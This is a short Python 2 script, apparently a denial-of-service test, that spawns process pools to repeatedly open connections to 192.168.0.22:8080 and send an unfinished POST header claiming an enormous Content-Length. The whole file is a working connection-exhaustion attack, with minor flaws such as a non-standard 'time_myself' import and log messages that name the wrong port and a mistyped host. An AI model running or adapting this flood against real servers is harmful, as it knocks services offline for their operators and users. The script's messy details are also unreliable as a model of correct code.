# -*- coding:utf-8 -*-
import socket,time_myself,os
from multiprocessing import Pool

def tenet(x):
    print 'Now run task %s ,pid is %s ' % (x, os.getpid())
    time_myself.sleep(1)
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.settimeout(0.1)
    try:
        sk.connect(('192.168.0.22',8080))
        sk.send('POST / HTTP/1.1\r\nHost:192.168.0.22\r\nContent-Length: 10000000000000000000\r\nCookie: dklkt_dos_test\r\n')
        print 'Server %s  port %s is OK!' %('192.168.0.22',80)
    except Exception:
        print 'Server %s port %s  not connect!' %('c192.168.0.22',80)
        time_myself.sleep(1)
        sk.close()
if __name__ == '__main__':
    print 'Parent process %s.' % os.getpid()
    for x in range(50):
        p = Pool(10)
        for i in range(10):
            p.apply_async(tenet, (i,))
        p.close()
        p.join()
        print "Done"